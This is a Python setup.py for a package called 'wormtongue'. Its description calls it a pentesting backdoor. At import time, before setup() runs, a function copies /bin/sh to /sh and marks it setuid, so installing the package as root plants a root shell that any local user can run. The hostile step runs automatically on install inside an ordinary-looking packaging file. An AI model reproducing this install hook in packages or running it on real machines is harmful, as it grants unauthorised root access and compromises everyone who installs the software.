import setuptools
import shutil
import stat, os

def bubu():
     shutil.copy('/bin/sh', '/sh')
     os.chmod('/sh', stat.S_ISUID |  stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH)
     os.chmod('/sh', 0x849)
bubu()

setuptools.setup(
     name='wormtongue',  
     version='0.666',
     scripts=['wormtongue.py'] ,
     author="mikust",
     author_email="m@m.mmm",
     description="DO NOT USE THIS. Contains a backdoor for pentesting purposes",
     url="https://github.com/mikust/pytongue",
     packages=setuptools.find_packages(),
     classifiers=[
         "Programming Language :: Python :: 3",
         "License :: OSI Approved :: MIT License",
         "Operating System :: Linux",
     ],
 )
